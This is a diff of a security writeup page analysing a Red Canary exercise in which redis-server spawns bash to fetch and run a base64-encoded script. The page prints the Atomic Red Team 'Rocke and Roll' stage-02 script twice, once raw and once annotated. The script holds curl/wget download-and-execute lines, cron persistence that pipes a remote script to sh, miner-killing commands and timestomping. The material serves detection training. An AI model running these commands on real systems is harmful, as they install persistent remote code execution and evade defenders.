@@ -3,24 +3,28 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Scenario #3 Analysis · Will Seligman</title>
-<link rel="stylesheet" href="/assets/style.css">
+<meta name="color-scheme" content="dark">
+<title>Scenario #3 Analysis · the-grizzly-bear</title>
+<meta name="description" content="Scenario #3 Analysis — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
 </head>
 <body>
-<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
 <div class="layout">
 <aside class="sidebar" id="sidebar">
-  <a class="brand" href="/index.html">
+  <a class="brand" href="../../../index.html">
     <span class="brand-flag">&#127988;</span>
-    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
   </a>
-  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-3-analysis.html"></nav>
+  <nav class="nav" id="nav-root" data-current="other/exercises/red-canary/scenario-3-analysis.html" data-root="../../.."></nav>
 </aside>
 <main class="content">
   <article class="doc">
-  <div class="breadcrumb"><a href="/other/index.html">Other</a> &rsaquo; <a href="/other/exercises.html">Exercises</a> &rsaquo; <a href="/other/exercises/red-canary.html">Red Canary</a></div>
-  <h1 id="scenario-3-analysis">Scenario #3 Analysis</h1>
-<pre><code class="language-text">#Redis server as parent process
+  <div class="breadcrumb"><a href="../../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../../index.html">Other</a> &rsaquo; <a href="../index.html">Exercises</a> &rsaquo; <a href="index.html">Red Canary</a></div>
+<h1 id="title">Scenario #3 Analysis</h1>
+
+<pre><code>#Redis server as parent process
 Parent Process: redis-server
 #https://www.virustotal.com/gui/file/609aa5f366aee242bc237fbafad20214e9c4f1d2d721c87859ba3ae3555873b8
 Parent MD5: 9494cfd0f8c829acd9b1a88f9a0fd2ec
@@ -28,13 +32,12 @@ Parent MD5: 9494cfd0f8c829acd9b1a88f9a0fd2ec
 #Process spwawns bash shell and curls command to download script hosted on github, base64 decode, and execute the script
 Process CLI: 
 bash -c “curl  hxxps://gist.githubusercontent[.]com/ForensicITGuy/165c3de5c3f23168517820b12311fd35/raw/c6e44a7e946fba1bb5eaa0d570aeb98727b8cdc8/totes-evil.sh | base64 -d | bash”
-Network connection count: 1
-</code></pre>
-<p><a href="https://redcanary.com/blog/threat-detection/rocke-cryptominer/">https://redcanary.com/blog/threat-detection/rocke-cryptominer/</a></p>
+Network connection count: 1</code></pre>
+<p><a href="https://redcanary.com/blog/threat-detection/rocke-cryptominer/" target="_blank" rel="noopener">https://redcanary.com/blog/threat-detection/rocke-cryptominer/</a></p>
 <p>Sandbox check for the script</p>
-<p><span class="img-missing">image unavailable</span></p>
-<p>Cyberchef decode</p>
-<p><span class="img-missing">image unavailable</span></p>
+<p class="figure"><a class="img-link" href="scenario-3-analysis/image.png"><img src="scenario-3-analysis/image.png" alt="image.png" loading="lazy"></a></p>
+<p><a href="../../../huntress/2024-huntress-ctf/2024-10-01-base64by32-scripting.html">Cyberchef</a> decode</p>
+<p class="figure"><a class="img-link" href="scenario-3-analysis/image-1.png"><img src="scenario-3-analysis/image-1.png" alt="image.png" loading="lazy"></a></p>
 <p>Raw script before analysis</p>
 <pre><code class="language-bash">#! /bin/bash
 
@@ -60,12 +63,12 @@ rm -rf /tmp/kworkerds /var/tmp/kworkerds
 
 #   Tactic: Discovery
 #   Technique: T1057 - Process Discovery
-ps auxf|grep -v grep|grep -v &quot;\_&quot; |grep -v &quot;kthreadd&quot; |grep &quot;\[.*\]&quot;|awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;xmrig&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;Xbash&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;stratum&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;xmr&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;minerd&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep -v "\_" |grep -v "kthreadd" |grep "\[.*\]"|awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "stratum" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "minerd" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
 
 #   Tactic: Discovery
 #   Technique: T1049 - System Network Connections Discovery
@@ -78,7 +81,7 @@ netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs ki
 netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 &gt;/dev/null 2&gt;&amp;1
 netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 &gt;/dev/null 2&gt;&amp;1
 
-echo $(date -u) &quot;Executed Atomic Red Team Rocke and Roll, Stage 02, part C&quot; &gt;&gt; /tmp/atomic.log
+echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part C" &gt;&gt; /tmp/atomic.log
 }
 
 function b() {
@@ -93,22 +96,22 @@ function b() {
     (curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -o /var/tmp/kworkerds||wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -O /var/tmp/kworkerds) &amp;&amp; chmod +x /var/tmp/kworkerds
     nohup /var/tmp/kworkerds &gt;/dev/null 2&gt;&amp;1 &amp;
 
-    echo $(date -u) &quot;Executed Atomic Red Team Rocke and Roll, Stage 02, part B&quot; &gt;&gt; /tmp/atomic.log
+    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part B" &gt;&gt; /tmp/atomic.log
 }
 
 function a() {
 
     #   Tactic: Defense Evasion
     #   Technique: T1222 - File Permission Modification
-    chattr -i /etc/cron.d/root /var/spool/cron/root /var/spool/cron/crontabs/root
+	chattr -i /etc/cron.d/root /var/spool/cron/root /var/spool/cron/crontabs/root
 
     #   Tactic: Persistence
     #   Technique: T1168 - Local Job Scheduling
-    echo -e &quot;*/10 * * * * root (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##&quot; &gt; /etc/cron.d/root
-    mkdir -p /var/spool/cron/crontabs
-    echo -e &quot;*/31 * * * * (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##&quot; &gt; /var/spool/cron/crontabs/root
-    mkdir -p /etc/cron.daily
-    (curl -fsSL --connect-timeout 120 https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)
+	echo -e "*/10 * * * * root (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##" &gt; /etc/cron.d/root
+	mkdir -p /var/spool/cron/crontabs
+	echo -e "*/31 * * * * (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##" &gt; /var/spool/cron/crontabs/root
+	mkdir -p /etc/cron.daily
+	(curl -fsSL --connect-timeout 120 https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)
 
     #   Tactic: Defense Evasion
     #   Technique: T1222 - File Permission Modification
@@ -116,17 +119,16 @@ function a() {
 
     #   Tactic: Defense Evasion
     #   Technique: T1099 - Timestomp
-    touch -acmr /bin/sh /etc/cron.daily/oanacroner
+	touch -acmr /bin/sh /etc/cron.daily/oanacroner
     touch -acmr /bin/sh /etc/cron.d/root
     touch -acmr /bin/sh /var/spool/cron/crontabs/root
 
-    echo $(date -u) &quot;Executed Atomic Red Team Rocke and Roll, Stage 02, part A&quot; &gt;&gt; /tmp/atomic.log
+    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part A" &gt;&gt; /tmp/atomic.log
 }
 
 a
 b
-c
-</code></pre>
+c</code></pre>
 <p>Stepped through analysis within the comments, after the script is curled and executed in bash</p>
 <pre><code class="language-bash">#! /bin/bash
 
@@ -156,18 +158,16 @@ chattr -i /tmp/kworkerds /var/tmp/kworkerds
 #   Technique: T1107 - File Deletion
 rm -rf /tmp/kworkerds /var/tmp/kworkerds
 
-
-# Kill processes that do not contain grep,  and underscore, and match the pattern. followed by terminating more possibly pre-existing crypto miners, force with -9
+*# Kill processes that do not contain grep,  and underscore, and match the pattern. followed by terminating more possibly pre-existing crypto miners, force with -9*
 
 #   Tactic: Discovery
 #   Technique: T1057 - Process Discovery
-ps auxf|grep -v grep|grep -v &quot;\_&quot; |grep -v &quot;kthreadd&quot; |grep &quot;\[.*\]&quot;|awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;xmrig&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;Xbash&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;stratum&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;xmr&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-ps auxf|grep -v grep|grep &quot;minerd&quot; | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
-
+ps auxf|grep -v grep|grep -v "\_" |grep -v "kthreadd" |grep "\[.*\]"|awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "stratum" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
+ps auxf|grep -v grep|grep "minerd" | awk '{print $2}'|xargs kill -9 &gt;/dev/null 2&gt;&amp;1
 
 # More local reconnissance to further check if other crypto miners are present
 
@@ -183,7 +183,7 @@ netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs k
 netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 &gt;/dev/null 2&gt;&amp;1
 
 # Log the date and quoted string to the log
-echo $(date -u) &quot;Executed Atomic Red Team Rocke and Roll, Stage 02, part C&quot; &gt;&gt; /tmp/atomic.log
+echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part C" &gt;&gt; /tmp/atomic.log
 }
 
 #function b
@@ -196,14 +196,14 @@ function b() {
     #   Technique: T1222 - File Permission Modification
     chmod 1777 /var/tmp
 
-#Downloads a script atomic-hello using curl or wget and executes it in the background
+#**Downloads a script atomic-hello using curl or wget and executes it in the background**
     #   Tactic: Defense Evasion
     #   Technique: T1036 - Masquerading
     (curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -o /var/tmp/kworkerds||wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -O /var/tmp/kworkerds) &amp;&amp; chmod +x /var/tmp/kworkerds
     nohup /var/tmp/kworkerds &gt;/dev/null 2&gt;&amp;1 &amp;
 
 #Appends timestamp to /tmp/atomic.log
-    echo $(date -u) &quot;Executed Atomic Red Team Rocke and Roll, Stage 02, part B&quot; &gt;&gt; /tmp/atomic.log
+    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part B" &gt;&gt; /tmp/atomic.log
 }
 
 #function a
@@ -212,17 +212,17 @@ function a() {
 #Removes the immutable attribute from cron job files to allow modifications
     #   Tactic: Defense Evasion
     #   Technique: T1222 - File Permission Modification
-    chattr -i /etc/cron.d/root /var/spool/cron/root /var/spool/cron/crontabs/root
+	chattr -i /etc/cron.d/root /var/spool/cron/root /var/spool/cron/crontabs/root
 
 #Schedules daily downloads of a malicious script 
     #   Tactic: Persistence
     #   Technique: T1168 - Local Job Scheduling
-    echo -e &quot;*/10 * * * * root (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##&quot; &gt; /etc/cron.d/root
-    mkdir -p /var/spool/cron/crontabs
-    echo -e &quot;*/31 * * * * (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##&quot; &gt; /var/spool/cron/crontabs/root
-    mkdir -p /etc/cron.daily
-    #Fetches the same malicious script to /etc/cron.daily/oanacroner
-    (curl -fsSL --connect-timeout 120 https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)
+	echo -e "*/10 * * * * root (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##" &gt; /etc/cron.d/root
+	mkdir -p /var/spool/cron/crontabs
+	echo -e "*/31 * * * * (curl -fsSL https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh)|sh\n##" &gt; /var/spool/cron/crontabs/root
+	mkdir -p /etc/cron.daily
+	#Fetches the same malicious script to /etc/cron.daily/oanacroner
+	(curl -fsSL --connect-timeout 120 https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://gist.githubusercontent.com/ForensicITGuy/671d3ac59616d52295b38081f36eae20/raw/63318276ebf46b1facbab8b3db2305e49a596e45/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)
 
 #Set permissions owner read, write, execute, group read, execute, others read, execute
     #   Tactic: Defense Evasion
@@ -232,24 +232,23 @@ function a() {
 #Uses touch -acmr to timestomp cron job files, mimicking the timestamp of /bin/sh
     #   Tactic: Defense Evasion
     #   Technique: T1099 - Timestomp
-    touch -acmr /bin/sh /etc/cron.daily/oanacroner
+	touch -acmr /bin/sh /etc/cron.daily/oanacroner
     touch -acmr /bin/sh /etc/cron.d/root
     touch -acmr /bin/sh /var/spool/cron/crontabs/root
 
 #Appends timestamp to /tmp/atomic.log
-    echo $(date -u) &quot;Executed Atomic Red Team Rocke and Roll, Stage 02, part A&quot; &gt;&gt; /tmp/atomic.log
+    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part A" &gt;&gt; /tmp/atomic.log
 }
 
 #Execute function a then b then c
 a
 b
-c
-</code></pre>
+c</code></pre>
   </article>
-  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
 </div>
-<script src="/assets/nav.js" defer></script>
+<script src="../../../assets/nav.js" defer></script>
 <script>
 document.getElementById('menu-toggle').addEventListener('click',function(){
   document.getElementById('sidebar').classList.toggle('open');
